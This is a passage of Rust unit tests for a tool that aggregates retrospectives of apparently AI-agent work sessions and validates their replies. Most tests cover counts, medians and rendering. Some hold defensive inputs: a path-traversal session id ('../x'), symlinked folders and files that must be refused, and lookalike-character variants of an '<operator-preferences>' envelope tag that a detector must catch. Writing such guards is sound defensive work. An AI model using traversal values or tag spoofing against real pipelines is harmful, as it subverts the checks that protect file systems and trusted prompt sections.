        let printed = loads(&summary).unwrap();
        let folder = home.join("retro").join(RUN);
        let transcripts = retro_transcripts().display().to_string();
        let path = |name: &str| folder.join(name).display().to_string();
        assert_eq!(
            printed,
            json!({"run": RUN, "from": day(6), "to": TODAY, "hosts": ["host-a", "host-b"],
                   "expected": ["host-a", "host-c"], "stale": ["host-a"], "sessions": 3, "skipped": 3,
                   "dir": folder.display().to_string(), "aggregate": path("aggregate.json"),
                   "digest": path("digest.jsonl"), "transcripts": transcripts, "out": path("reply.json"),
                   "findings": path("findings.md")})
        );
        let rows: Vec<Value> = fs::read_to_string(folder.join("digest.jsonl"))
            .unwrap()
            .lines()
            .map(|l| loads(l).unwrap())
            .collect();
        let sessions: Vec<&Value> = rows.iter().map(|r| &r["session"]).collect();
        assert_eq!(sessions, [&json!(S1), &json!(S2), &json!(S3)]);
        let agg = loads(&fs::read_to_string(folder.join("aggregate.json")).unwrap()).unwrap();
        let tokens =
            json!({"cache_read": 300, "cache_write": 30, "uncached_input": 15, "output": 3});
        let sub = json!({"cache_read": 120, "cache_write": 0, "uncached_input": 6, "output": 9});
        let three = json!([
            format!("host-a/{S1}"),
            format!("host-a/{S2}"),
            format!("host-b/{S3}")
        ]);
        let reviewers: Map<String, Value> = REVIEWERS
            .iter()
            .map(|r| (r.to_string(), no_findings()))
            .collect();
        assert_eq!(
            agg,
            json!({
                "schema": "factory.retro-aggregate/1", "run": RUN, "from": day(6), "to": TODAY,
                "host": "host-a", "transcripts": transcripts, "projects": ["factory", "sample-tools"],
                "hosts": {"host-a": {"sessions": 2, "jobs": 1, "ad_hoc": 1, "latest": day(1)},
                          "host-b": {"sessions": 1, "jobs": 1, "ad_hoc": 0, "latest": TODAY}},
                "tokens": {"main": tokens, "subagents": sub},
                "context": {"first_turn_median": 1000, "mean_per_turn_median": 2000},
                "attachments_median": {"skill_listing": 300},
                "env_noise": {"winsize_crash": 6}, "polls": {"sleep": 3},
                "denials": {"count": 3, "blocked_sleep": 3, "patterns": [
                    {"text": "denied rm", "count": 3, "sessions": three}]},
                "errors": {"count": 9, "benign": 1, "patterns": [
                    {"text": "winsize crash", "count": 9, "sessions": three}]},
                "repeated_cmds": [{"text": "ls <path>", "count": 9, "sessions": three}],
                "subagents": {"factory-builder": {"count": 3, "turns": 21, "errors": 3, "denials": 0, "tokens": sub,
                                                  "first_turn_median": 500}},
                "review_rounds": {"1": 2}, "agent_prompts": {"count": 3, "chars": 150}, "human_msgs": 3,
                "interrupts": 0,
                "pipeline": {"global": {"version": 0, "stage_notes": {}},
                             "projects/factory": {"version": 7, "stage_notes": {"spec": "Keep it short."}},
                             "projects/sample-tools": {"version": 0, "stage_notes": {}}},
                "documents": {
                    "factory/project.md": {"version": 3, "text": "---\nrepo: example/factory\nbase: main\ntitle: Factory\n---\n"},
                    "factory/notes.md": {"version": 4, "text": "- Run pnpm test.\n"},
                    "factory/decisions.md": {"version": 0, "text": "# Decisions\n"},
                    "factory/runbook.md": {"version": 1, "text": "# Runbook\n"}},
                "merged": [], "red_flags": [], "lessons": [], "reviewers": reviewers})
        );
    }

    #[test]
    fn aggregate_lists_merged_jobs() {
        let inside = format!("{TODAY}T12:30:00Z");
        let earlier = format!("{}T08:00:00Z", day(2));
        let outside = format!("{}T08:00:00Z", day(9));
        let long = format!("Guard the ls alias {}", "x".repeat(200));
        let jobs = json!([
            {"id": "1700-guard-the-ls", "project": "factory", "title": long, "stage": "merged", "done": inside},
            {"id": "1650-old-fix", "project": "factory", "title": "Old fix", "stage": "merged", "done": outside},
            {"id": "1690-closed-job", "project": "factory", "title": "Closed", "stage": "closed", "done": inside},
            {"id": "1695-elsewhere", "project": "unregistered", "title": "Elsewhere", "stage": "merged", "done": inside},
            {"id": "1680-pin-node", "project": "sample-tools", "title": "Pin node", "stage": "merged", "done": earlier}]);
        let mut routes = window(
            7,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                )],
            )],
        );
        routes.insert("/api/board".into(), reply(board(jobs)));
        let (_, agg) = aggregate_of("merged", &routes, 7);
        assert_eq!(
            agg["merged"],
            json!([
                {"id": "1700-guard-the-ls", "project": "factory", "title": cut(&long, 120), "merged": inside},
                {"id": "1680-pin-node", "project": "sample-tools", "title": "Pin node", "merged": earlier}])
        );
    }

    fn lessons_of(name: &str, jobs: Value, pushed: Option<Vec<(&str, String)>>) -> Value {
        let pushed = pushed.unwrap_or_else(|| {
            vec![(
                "host-a",
                lines(&[digest_row("host-a", S1, "1017", json!({}))]),
            )]
        });
        let mut routes = window(7, &[(0, pushed)]);
        routes.insert("/api/board".into(), reply(board(jobs)));
        aggregate_of(name, &routes, 7).1["lessons"].clone()
    }

    #[test]
    fn aggregate_lists_lessons() {
        let inside = format!("{TODAY}T12:30:00Z");
        let earlier = format!("{}T08:00:00Z", day(2));
        let oldest = format!("{}T08:00:00Z", day(3));
        let reason = "rejected: Worker route changes need pnpm test:protocol; pnpm test skips them";
        let jobs = json!([
            {"id": "1715-dark-mode", "project": "factory", "title": "Dark mode", "stage": "closed", "done": earlier,
             "backlog": {"line": "Dark mode", "decision": "denied", "notes": "duplicate of the theme idea"}},
            {"id": "1712-export-csv", "project": "factory", "title": "Export CSV", "stage": "closed", "done": inside,
             "pr": "https://github.com/example/factory/pull/12", "note": "closed",
             "close": {"reason": format!("{reason}\n"), "at": inside}},
            {"id": "1709-pin-node", "project": "sample-tools", "title": "Pin node", "stage": "closed", "done": oldest,
             "pr": "https://github.com/example/sample-tools/pull/3", "note": "Node pins live in mise.toml only",
             "close": {"closed": oldest}}]);
        let pushed = vec![
            (
                "host-a",
                lines(&[digest_row("host-a", S1, "1712", json!({}))]),
            ),
            (
                "host-b",
                lines(&[
                    digest_row("host-b", S3, "1712", json!({})),
                    digest_row("host-b", S2, "1715x", json!({})),
                ]),
            ),
        ];
        assert_eq!(
            lessons_of("lessons", jobs, Some(pushed)),
            json!([
                {"job": "1712-export-csv", "project": "factory", "kind": "pr-closed", "title": "Export CSV",
                 "reason": reason, "at": inside, "sessions": [format!("host-a/{S1}"), format!("host-b/{S3}")]},
                {"job": "1715-dark-mode", "project": "factory", "kind": "denied", "title": "Dark mode",
                 "reason": "duplicate of the theme idea", "at": earlier, "sessions": []},
                {"job": "1709-pin-node", "project": "sample-tools", "kind": "pr-closed", "title": "Pin node",
                 "reason": "Node pins live in mise.toml only", "at": oldest, "sessions": []}])
        );
    }

    #[test]
    fn aggregate_skips_lessons() {
        let inside = format!("{TODAY}T12:30:00Z");
        let outside = format!("{}T08:00:00Z", day(9));
        let pr = "https://github.com/example/factory/pull/1";
        let denied =
            json!({"decision": "denied", "notes": "Needs a person to pick the theme first"});
        let jobs = json!([
            {"id": "1701-old", "project": "factory", "title": "Old", "stage": "closed", "done": outside, "backlog": denied},
            {"id": "1702-elsewhere", "project": "unregistered", "title": "Elsewhere", "stage": "closed", "done": inside,
             "backlog": denied},
            {"id": "1703-merged", "project": "factory", "title": "Merged", "stage": "merged", "done": inside, "pr": pr,
             "note": "Use the protocol suite"},
            {"id": "1704-no-pr", "project": "factory", "title": "No PR", "stage": "closed", "done": inside,
             "note": "Abandoned before build"},
            {"id": "1705-empty", "project": "factory", "title": "Empty", "stage": "closed", "done": inside, "pr": pr,
             "note": " \n ", "close": {"reason": ""}},
            {"id": "1706-link", "project": "factory", "title": "Link", "stage": "closed", "done": inside,
             "backlog": {"decision": "denied", "notes": "see https://example.test/why"}}]);
        assert_eq!(lessons_of("skip-lessons", jobs, None), json!([]));
    }

    #[test]
    fn aggregate_caps_lessons() {
        let jobs: Vec<Value> = (0..24)
            .map(|n| {
                json!({"id": format!("{}-job", 1800 + n), "project": "factory", "title": format!("Job {n}"),
                       "stage": "closed", "done": format!("{}T{n:02}:00:00Z", day(n % 5)),
                       "backlog": {"decision": "denied", "notes": format!("Reason {n}")}})
            })
            .collect();
        let mut expected = jobs.clone();
        expected.sort_by(|a, b| b["done"].as_str().cmp(&a["done"].as_str()));
        let lessons = lessons_of("cap-lessons", json!(jobs), None);
        let got: Vec<&Value> = lessons
            .as_array()
            .unwrap()
            .iter()
            .map(|r| &r["job"])
            .collect();
        let want: Vec<&Value> = expected.iter().take(20).map(|j| &j["id"]).collect();
        assert_eq!(got, want);
        assert_eq!(got.len(), RETRO_LESSONS_MAX);
    }

    #[test]
    fn aggregate_lists_repeated_findings() {
        let inside = format!("{TODAY}T10:00:00Z");
        let earlier = format!("{}T10:00:00Z", day(2));
        let csv = json!({"round": 2, "first": 1, "reviewer": "code", "signature": "worker/export.js#missing-person-check",
                         "at": earlier});
        let zip = json!({"round": 3, "first": 1, "reviewer": "code", "signature": "worker/zip.js#missing-person-check",
                         "at": inside});
        let jobs = json!([
            {"id": "1748-export-csv", "project": "factory", "title": "Export CSV", "stage": "merged", "done": inside,
             "repeated": [csv]},
            {"id": "1760-export-zip", "project": "factory", "title": "Export ZIP", "stage": "review", "repeated": [zip]}]);
        let pushed = vec![(
            "host-a",
            lines(&[digest_row("host-a", S1, "1760", json!({}))]),
        )];
        assert_eq!(
            lessons_of("repeated", jobs, Some(pushed)),
            json!([
                {"job": "1760-export-zip", "project": "factory", "kind": "repeated-finding", "title": "Export ZIP",
                 "reason": "code repeated worker/zip.js#missing-person-check from round 1 in round 3", "at": inside,
                 "sessions": [format!("host-a/{S1}")], "reviewer": "code",
                 "signature": "worker/zip.js#missing-person-check"},
                {"job": "1748-export-csv", "project": "factory", "kind": "repeated-finding", "title": "Export CSV",
                 "reason": "code repeated worker/export.js#missing-person-check from round 1 in round 2",
                 "at": earlier, "sessions": [], "reviewer": "code",
                 "signature": "worker/export.js#missing-person-check"}])
        );
    }

    #[test]
    fn aggregate_skips_repeated_findings() {
        let inside = format!("{TODAY}T10:00:00Z");
        let outside = format!("{}T10:00:00Z", day(9));
        let good = json!({"round": 2, "first": 1, "reviewer": "code",
                          "signature": "worker/export.js#missing-person-check", "at": inside});
        let bad = json!([
            with(&good, json!({"at": outside})),
            with(&good, json!({"reviewer": "builder"})),
            with(&good, json!({"signature": "worker/export.js"})),
            with(
                &good,
                json!({"signature": "see https://example.test/x#a-b"})
            ),
            with(&good, json!({"round": 0})),
            with(&good, json!({"first": "1"})),
            with(&good, json!({"round": true})),
            with(&good, json!({"at": null})),
            "code repeated it"
        ]);
        let jobs = json!([
            {"id": "1748-export-csv", "project": "factory", "title": "Export CSV", "stage": "review", "repeated": bad},
            {"id": "1749-elsewhere", "project": "unregistered", "title": "Elsewhere", "stage": "review",
             "repeated": [good]},
            {"id": "1750-not-a-list", "project": "factory", "title": "Not a list", "stage": "review", "repeated": good}]);
        assert_eq!(lessons_of("skip-repeated", jobs, None), json!([]));
    }

    #[test]
    fn aggregate_counts_reviewer_accept_rate() {
        let job = json!({"id": "1740-cap-backlog", "project": "factory", "title": "Cap backlog", "stage": "merged",
            "done": format!("{TODAY}T12:30:00Z"),
            "rounds": [{"security": "CHANGES", "ux": "SKIPPED", "ui": "SKIPPED", "code": "CHANGES"},
                       {"security": "PASS", "ux": "SKIPPED", "ui": "SKIPPED", "code": "PASS"}]});
        let mut routes = window(
            7,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1740", json!({}))]),
                )],
            )],
        );
        routes.insert("/api/board".into(), reply(board(json!([job]))));
        let prefix = "/api/jobs/factory/1740-cap-backlog/";
        routes.insert(
            format!("{prefix}round-1/review-code.md"),
            reply(json!("VERDICT: CHANGES\n\nSignature: worker/backlog.js#missing-limit-check\nSignature: worker/backlog.js#unbounded-loop\n")),
        );
        routes.insert(
            format!("{prefix}round-1/review-security.md"),
            reply(json!(
                "VERDICT: CHANGES\n\nSignature: worker/backlog.js#unescaped-title\n"
            )),
        );
        routes.insert(
            format!("{prefix}build.md"),
            reply(json!(
                "### Disputed findings\n\n| Round | Reviewer | Signature | Reason |\n| --- | --- | --- | --- |\n\
                 | 1 | code | `worker/backlog.js#unbounded-loop` | The loop stops at BACKLOG_MAX. |\n\
                 | 1 | code | worker/backlog.js#never-raised | Not in the review. |\n"
            )),
        );
        let (_, agg) = aggregate_of("accept", &routes, 7);
        assert_eq!(agg["reviewers"], accept());
    }

    #[test]
    fn aggregate_closed_job_without_build_md_counts_findings_fixed() {
        let job = json!({"id": "1741-trim-backlog", "project": "factory", "title": "Trim backlog", "stage": "closed",
            "done": format!("{TODAY}T12:30:00Z"),
            "rounds": [{"security": "PASS", "ux": "SKIPPED", "ui": "SKIPPED", "code": "CHANGES"}]});
        let mut routes = window(
            7,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1741", json!({}))]),
                )],
            )],
        );
        routes.insert("/api/board".into(), reply(board(json!([job]))));
        routes.insert(
            "/api/jobs/factory/1741-trim-backlog/round-1/review-code.md".into(),
            reply(json!("VERDICT: CHANGES\n\nSignature: worker/backlog.js#missing-limit-check\nSignature: worker/backlog.js#unbounded-loop\n")),
        );
        let (_, agg) = aggregate_of("no-build", &routes, 7);
        assert_eq!(
            agg["reviewers"]["code"],
            json!({"changes": 2, "fixed": 2, "disputed": 0, "accept_pct": 100, "jobs": 1, "project": "factory",
                   "sessions": []})
        );
        assert_eq!(agg["reviewers"]["security"], no_findings());
    }

    #[test]
    fn aggregate_latest_is_the_newest_kept_row() {
        let routes = window(
            7,
            &[
                (
                    1,
                    vec![(
                        "host-a",
                        lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                    )],
                ),
                (
                    0,
                    vec![
                        ("host-a", "not json\n".to_string()),
                        (
                            "host-b",
                            lines(&[digest_row("host-b", S2, "1017", json!({}))]),
                        ),
                    ],
                ),
            ],
        );
        let (printed, agg) = aggregate_of("latest", &routes, 7);
        assert_eq!(
            (&printed["stale"], &printed["skipped"]),
            (&json!(["host-a"]), &json!(1))
        );
        assert_eq!(agg["hosts"]["host-a"]["latest"], json!(day(1)));
    }

    #[test]
    fn aggregate_medians_skip_runs_with_no_usage() {
        let mut empty = digest_row(
            "host-a",
            S2,
            "1017",
            json!({"context": {"first_turn": 0, "mean_per_turn": 0}}),
        );
        empty["subagents"]["by_type"]["factory-builder"]["first_turns"] = json!([0]);
        let routes = window(
            7,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1017", json!({})), empty]),
                )],
            )],
        );
        let (_, agg) = aggregate_of("medians", &routes, 7);
        assert_eq!(agg["context"]["first_turn_median"], 1000);
        assert_eq!(
            agg["subagents"]["factory-builder"]["first_turn_median"],
            500
        );
    }

    #[test]
    fn aggregate_patterns_ranked_and_capped() {
        let many: Map<String, Value> = (0..25)
            .map(|n| (format!("err {n:02}"), json!(n + 1)))
            .collect();
        let rows: Vec<Value> = (0..7)
            .map(|n| {
                digest_row(
                    "host-a",
                    &format!("{n:08x}"),
                    "1017",
                    json!({"errors": {"count": 1, "benign": 0, "patterns": many}}),
                )
            })
            .collect();
        let (_, agg) = aggregate_of(
            "ranked",
            &window(1, &[(0, vec![("host-a", lines(&rows))])]),
            1,
        );
        let patterns = agg["errors"]["patterns"].as_array().unwrap();
        let texts: Vec<&str> = patterns
            .iter()
            .map(|p| p["text"].as_str().unwrap())
            .collect();
        let want: Vec<String> = (5..25).rev().map(|n| format!("err {n:02}")).collect();
        assert_eq!(texts, want);
        assert_eq!(patterns[0]["count"], 25 * 7);
        let five: Vec<String> = (0..5).map(|n| format!("host-a/{n:08x}")).collect();
        assert_eq!(patterns[0]["sessions"], json!(five));
    }

    #[test]
    fn aggregate_ad_hoc_masked() {
        let rows = [
            digest_row(
                "host-a",
                S1,
                "ad-hoc",
                json!({"project": "~-dev-private-thing"}),
            ),
            digest_row("host-a", S2, "1017", json!({})),
        ];
        let (printed, _) = aggregate_of(
            "ad-hoc",
            &window(7, &[(0, vec![("host-a", lines(&rows))])]),
            7,
        );
        for key in ["aggregate", "digest"] {
            assert!(!fs::read_to_string(printed[key].as_str().unwrap())
                .unwrap()
                .contains("private-thing"));
        }
        let masked: Vec<Value> = fs::read_to_string(printed["digest"].as_str().unwrap())
            .unwrap()
            .lines()
            .map(|l| loads(l).unwrap()["project"].clone())
            .collect();
        assert_eq!(masked, [json!("ad-hoc"), json!("~-dev-factory")]);
    }

    #[test]
    fn aggregate_empty_window_and_usage() {
        let home = agg_home("empty");
        let e = aggregate_in(&home, TODAY, RUN, 7, &mut serve(&window(7, &[]))).unwrap_err();
        assert_eq!(e.code, 3);
        assert!(e.stderr.contains(&format!(
            "no host pushed a retro digest from {} to {TODAY}",
            day(6)
        )));
        assert!(!home.join("retro").exists());
        let routes = window(
            30,
            &[(
                29,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                )],
            )],
        );
        let (printed, _) = aggregate_of("thirty", &routes, 30);
        assert_eq!(printed["from"], json!(day(29)));
    }

    #[test]
    fn aggregate_rows_need_their_host_and_a_session_id() {
        let rows = [
            digest_row("host-a", S1, "1017", json!({})),
            digest_row("host-z", S1, "1017", json!({})),
            digest_row("host-a", "../x", "1017", json!({})),
        ];
        let (printed, _) = aggregate_of(
            "row-checks",
            &window(1, &[(0, vec![("host-a", lines(&rows))])]),
            1,
        );
        assert_eq!(
            (&printed["sessions"], &printed["skipped"]),
            (&json!(1), &json!(2))
        );
        let kept: Vec<Value> = fs::read_to_string(printed["digest"].as_str().unwrap())
            .unwrap()
            .lines()
            .map(|l| loads(l).unwrap())
            .collect();
        assert_eq!(kept, [digest_row("host-a", S1, "1017", json!({}))]);
    }

    #[cfg(unix)]
    #[test]
    fn aggregate_linked_retro_folder_refused() {
        let home = agg_home("linked");
        let target = home.join("elsewhere");
        fs::create_dir(&target).unwrap();
        std::os::unix::fs::symlink(&target, home.join("retro")).unwrap();
        let routes = window(
            1,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                )],
            )],
        );
        let e = aggregate_in(&home, TODAY, RUN, 1, &mut serve(&routes)).unwrap_err();
        assert_eq!(e.code, 2);
        assert_eq!(fs::read_dir(&target).unwrap().count(), 0);
    }

    const RUN_A: &str = "20261111T090000Z-a1b2c3";
    const REF: &str = "host-a/3ae1fc86-0000-4000-8000-000000000001";

    fn finding(over: Value) -> Value {
        with(
            &json!({"title": "ls alias crashes in non-interactive shells", "category": "tool-economy", "count": 253,
                    "cost": 250, "sessions": [REF], "root_cause": "The colorls alias needs a terminal size.",
                    "fix": "Alias ls only in interactive shells.", "project": "sample-tools"}),
            over,
        )
    }

    fn retro_reply(over: Value) -> Value {
        with(
            &json!({"schema": "factory.retro/1", "run": RUN_A, "findings": [finding(json!({}))], "suggestions": []}),
            over,
        )
    }

    /// A home with retro/RUN_A/aggregate.json, as RetroAdmitTest sets up.
    fn admit_home(name: &str) -> (PathBuf, PathBuf) {
        let home = temp_dir(&format!("retro-admit-{name}"));
        let folder = home.join("retro").join(RUN_A);
        fs::create_dir_all(&folder).unwrap();
        let agg = json!({"schema": "factory.retro-aggregate/1", "run": RUN_A, "from": "2026-11-05", "to": "2026-11-11",
                         "host": "host-a", "projects": ["factory", "sample-tools"],
                         "hosts": {"host-a": {"sessions": 40, "jobs": 12, "ad_hoc": 3}}});
        fs::write(folder.join("aggregate.json"), dumps(&agg, DEFAULT)).unwrap();
        (home, folder)
    }

    fn names(folder: &Path) -> Vec<String> {
        let mut names: Vec<String> = fs::read_dir(folder)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        names
    }

    #[test]
    fn admit_bad_reply_writes_nothing() {
        let (home, folder) = admit_home("bad-reply");
        for raw in [&b"not json"[..], b"{\"schema\": \"\xff\"}"] {
            fs::write(folder.join("reply.json"), raw).unwrap();
            let e = admit(&home, RUN_A).unwrap_err();
            assert_eq!(e.code, 2);
            let prefix = format!(
                "factory.py: {} is not UTF-8 JSON: ",
                folder.join("reply.json").display()
            );
            assert!(
                e.stderr.starts_with(&prefix) && e.stderr.ends_with("; nothing written\n"),
                "{}",
                e.stderr
            );
        }
        assert_eq!(names(&folder), ["aggregate.json", "reply.json"]);
    }

    #[test]
    fn admit_rejects_a_bad_card_after_writing_findings() {
        let (home, folder) = admit_home("suggestions");
        let card = json!({"kind": "tooling", "title": "Guard the ls alias", "finding": 1});
        fs::write(
            folder.join("reply.json"),
            dumps(&retro_reply(json!({"suggestions": [card]})), DEFAULT),
        )
        .unwrap();
        let e = admit(&home, RUN_A).unwrap_err();
        assert_eq!(e.code, 2);
        assert!(
            e.stderr
                .ends_with("; findings.md written, no cards admitted\n"),
            "{}",
            e.stderr
        );
        assert!(fs::read_to_string(folder.join("findings.md"))
            .unwrap()
            .contains("## Rejected cards"));
    }

    #[test]
    fn admit_fixed_job_id_escaped() {
        let agg =
            json!({"from": "2026-11-10", "to": "2026-11-16", "hosts": {"pc": {"sessions": 1}}});
        let title = json!({"title": "t"});
        let fixed = [(
            0,
            &title,
            json!("1700|legacy"),
            json!("2026-11-15T12:30:00Z"),
        )];
        let text = render_findings(&agg, "r1", &[], &[], &[], &fixed, &[]);
        assert!(
            text.contains("| 0 | t | 1700\\|legacy | 2026-11-15T12:30:00Z |"),
            "{text}"
        );
    }

    #[test]
    fn admit_reviewer_accept_rate_section() {
        let agg =
            json!({"from": "2026-11-10", "to": "2026-11-16", "hosts": {"pc": {"sessions": 1}}});
        let text = render_findings(
            &with(&agg, json!({"reviewers": accept()})),
            "r1",
            &[],
            &[],
            &[],
            &[],
            &[],
        );
        let section = [
            "## Reviewer accept rate",
            "",
            "CHANGES findings in jobs merged or closed in the window. Disputed counts findings the builder listed under Disputed findings in build.md; fixed is the rest.",
            "",
            "| Reviewer | CHANGES findings | Fixed | Disputed | Accept rate | Jobs |",
            "| --- | --- | --- | --- | --- | --- |",
            "| security | 1 | 1 | 0 | 100% | 1 |",
            "| code | 2 | 1 | 1 | 50% | 1 |",
        ]
        .join("\n");
        assert!(text.contains(&section), "{text}");
        assert!(!render_findings(&agg, "r1", &[], &[], &[], &[], &[])
            .contains("## Reviewer accept rate"));
    }

    #[test]
    fn admit_session_refs_still_validate() {
        assert_eq!(check_session_refs(&json!([REF])), None);
        assert_eq!(
            check_session_refs(&json!(["host-a/not-hex"])),
            Some("must be host/session refs".into())
        );
        assert_eq!(
            check_finding(
                &finding(json!({"sessions": ["host-a/not-hex"]})),
                &json!(["sample-tools"]),
                &json!([])
            ),
            Some((Some("sessions"), "must be host/session refs".into()))
        );
    }

    #[cfg(unix)]
    #[test]
    fn admit_linked_run_folder_refused() {
        let (home, folder) = admit_home("linked-folder");
        fs::write(
            folder.join("reply.json"),
            dumps(&retro_reply(json!({})), DEFAULT),
        )
        .unwrap();
        admit(&home, RUN_A).unwrap();
        std::os::unix::fs::symlink(&folder, home.join("retro/linked")).unwrap();
        let e = admit(&home, "linked").unwrap_err();
        assert_eq!(
            (e.code, e.stderr),
            (4, "factory.py: no retro run linked\n".to_string())
        );
    }

    #[cfg(unix)]
    #[test]
    fn admit_linked_run_files_refused() {
        let (home, folder) = admit_home("linked-files");
        let target = home.join("elsewhere");
        fs::write(
            folder.join("reply.json"),
            dumps(&retro_reply(json!({})), DEFAULT),
        )
        .unwrap();
        for name in [
            "reply.json",
            "aggregate.json",
            "findings.md",
            "suggestions.json",
        ] {
            let path = folder.join(name);
            let body = fs::read(&path).unwrap_or(b"keep\n".to_vec());
            fs::write(&target, &body).unwrap();
            let _ = fs::remove_file(&path);
            std::os::unix::fs::symlink(&target, &path).unwrap();
            let e = admit(&home, RUN_A).unwrap_err();
            assert_eq!(e.code, 2, "{name}");
            assert_eq!(
                e.stderr,
                format!(
                    "factory.py: {} is a link; nothing written\n",
                    path.display()
                )
            );
            assert_eq!(fs::read(&target).unwrap(), body);
            let mut want = vec![
                "aggregate.json".to_string(),
                "reply.json".to_string(),
                name.to_string(),
            ];
            want.sort();
            want.dedup();
            assert_eq!(names(&folder), want);
            fs::remove_file(&path).unwrap();
            if name == "reply.json" || name == "aggregate.json" {
                fs::write(&path, &body).unwrap();
            }
        }
    }

    #[test]
    fn admit_exactly_600_changed_characters_is_sent() {
        let note = "Name the acceptance check for each criterion.";
        let longer = format!("{}{}", &note[..10], "y".repeat(600 - (note.len() - 10)));
        assert_eq!(changed_chars(note, &longer), 600);
        assert_eq!(changed_chars("abc", "abc"), 0);
        assert_eq!(changed_chars("a\u{1F600}c", "abc"), 2);
        let agg = json!({"pipeline": {"projects/factory": {"version": 7, "stage_notes": {"spec": note}}}});
        let edit = json!({"scope": "projects/factory", "stage": "spec", "note": longer, "summary": "Spec note"});
        assert_eq!(check_edit(&edit, &agg), None);
        let over = with(&edit, json!({"note": format!("{longer}y")}));
        assert_eq!(
            check_edit(&over, &agg),
            Some((Some("note"), "changes more than 600 characters".into()))
        );
    }

    const PAIR_HINT: &str = "pair this host with factory.py host pair <id> <code>";

    #[test]
    fn push_outcome_write_only_names_the_pairing() {
        let e = push_outcome(
            403,
            &format!("{RETRO_WRITE_ONLY}\n"),
            PAIR_HINT,
            Path::new("/h/.env"),
        )
        .unwrap_err();
        assert_eq!(e.code, 2);
        assert_eq!(
            e.stderr,
            format!("factory.py: {RETRO_WRITE_ONLY}. {PAIR_HINT}\n")
        );
    }

    #[test]
    fn push_outcome_forbidden_is_an_access_failure() {
        let e = push_outcome(403, "Forbidden", PAIR_HINT, Path::new("/h/.env")).unwrap_err();
        assert_eq!(e.code, 5);
        assert!(
            e.stderr.contains("Access rejected the service token"),
            "{}",
            e.stderr
        );
        assert!(e.stderr.contains("/h/.env"));
    }

    #[test]
    fn push_outcome_ok_passes() {
        assert!(push_outcome(200, "ok", PAIR_HINT, Path::new("/h/.env")).is_ok());
    }

    #[test]
    fn py_str_matches_python() {
        assert_eq!(py_str(&json!(null)), "None");
        assert_eq!(py_str(&json!(true)), "True");
        assert_eq!(py_str(&json!("x")), "x");
        assert_eq!(py_str(&json!(1017)), "1017");
        assert_eq!(
            py_str(&serde_json::from_str::<Value>("2.50").unwrap()),
            "2.5"
        );
        assert_eq!(py_str(&serde_json::from_str::<Value>("-0").unwrap()), "0");
        assert_eq!(
            py_str(&json!([1, "a", null, {"k": false, "it's": 1e16}])),
            "[1, 'a', None, {'k': False, \"it's\": 1e+16}]"
        );
    }

    #[test]
    fn py_commas_and_median() {
        assert_eq!(commas(63_250), "63,250");
        assert_eq!(commas(250), "250");
        assert_eq!(commas(1_000_000), "1,000,000");
        assert_eq!(commas(-1234), "-1,234");
        assert_eq!(median(vec![]), 0);
        assert_eq!(median(vec![3, 1, 2]), 2);
        assert_eq!(median(vec![1000, 2001]), 1500);
        assert_eq!(median(vec![-3, 0]), -1);
    }

    #[test]
    fn py_int_and_none_reply() {
        assert!(is_int(&json!(5)) && !is_int(&json!(5.0)) && !is_int(&json!(true)));
        assert!(!is_int(&serde_json::from_str("1e3").unwrap()));
        assert_eq!(int_of(Some(&json!(7))), 7);
        assert_eq!(int_of(Some(&json!("7"))), 0);
        assert_eq!(
            int_of(Some(&serde_json::from_str("99999999999999999999").unwrap())),
            0
        );
        assert!(is_none_reply(&json!({"none": true})));
        assert!(is_none_reply(&json!({"none": 1})));
        assert!(is_none_reply(&json!({"none": 1.0})));
        assert!(!is_none_reply(&json!({"none": true, "x": 1})));
        assert!(!is_none_reply(&json!({"none": false})));
        assert!(!is_none_reply(&json!([])));
    }

    #[test]
    fn py_dates_and_when() {
        assert!(is_date("2026-11-11") && is_date("2024-02-29"));
        for bad in [
            "2026-02-30",
            "2026-11-1",
            "11/11/2026",
            "x",
            "0000-01-01",
            "２026-11-11",
        ] {
            assert!(!is_date(bad), "{bad}");
        }
        assert_eq!(shift_date("2026-03-01", -1), "2026-02-28");
        assert_eq!(shift_date("2026-11-12", -6), "2026-11-06");
        let at = |s: &str| when(Some(&json!(s)));
        assert_eq!(at("1970-01-01T00:00:00Z"), Some(0));
        assert_eq!(at("1970-01-01T01:00:00+01:00"), Some(0));
        assert_eq!(at("1970-01-01 00:00:01.5Z"), None);
        assert_eq!(at("1970-01-01T00:00:01.500Z"), Some(1_500_000));
        assert_eq!(at("1970-01-01T00:00:01.000001-00:00"), Some(1_000_001));
        assert_eq!(at("1970-01-01T00Z"), Some(0));
        assert_eq!(at("1970-01-01T00:00:00"), None);
        assert_eq!(at("not a time"), None);
        assert_eq!(at("2026-11-14"), None);
        assert_eq!(when(Some(&json!(5))), None);
        assert_eq!(when(None), None);
        assert!(at("2026-11-14T09:00:00Z") < at("2026-11-15T12:30:00Z"));
    }

    #[test]
    fn py_today_and_run_name() {
        assert!(is_date(&local_today()));
        let run = run_name();
        assert!(RUN_TAG.is_full(&run));
        assert_eq!(run.len(), 23);
        assert_eq!(&run[8..9], "T");
        assert_eq!(&run[15..17], "Z-");
    }

    #[test]
    fn py_envelope_tag_folds_lookalikes() {
        assert!(has_envelope_tag("<operator-preferences>"));
        assert!(has_envelope_tag("＜operator-preferences"));
        assert!(has_envelope_tag("‹/ operator‐preferences"));
        assert!(!has_envelope_tag("operator preferences"));
    }
}
